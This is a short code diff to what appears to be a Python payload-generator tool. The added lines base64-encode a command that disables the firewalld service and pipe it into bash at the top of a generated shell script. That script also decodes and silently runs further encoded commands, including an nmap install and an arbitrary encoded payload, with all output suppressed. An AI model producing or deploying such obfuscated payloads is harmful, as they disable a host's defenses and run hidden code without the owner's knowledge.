@@ -114,8 +114,12 @@ c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 		os.system(f"chmod 777 {output}/{name}.sh ")
 elif payload=="4":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
+	firewalls="systemctl disable firewalld &> /dev/null"
+	firewall=base64.b64encode(firewalls.encode("utf-8"))
+	firewalld=firewall.decode("utf-8")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""c1=$(base64 -d <<< "c3VkbyB5dW0gaW5zdGFsbCBubWFwCg=="); status=$?
+		s=(f"""base64 -d <<< {firewalld} | bash
+c1=$(base64 -d <<< "c3VkbyB5dW0gaW5zdGFsbCBubWFwCg=="); status=$?
 [[ $status == 0 ]] && $c1 &> /dev/null
 c2=$(base64 -d <<< "{encodeds}"); dstatus=$?
 [[ $dstatus == 0 ]] && $c2 &> /dev/null
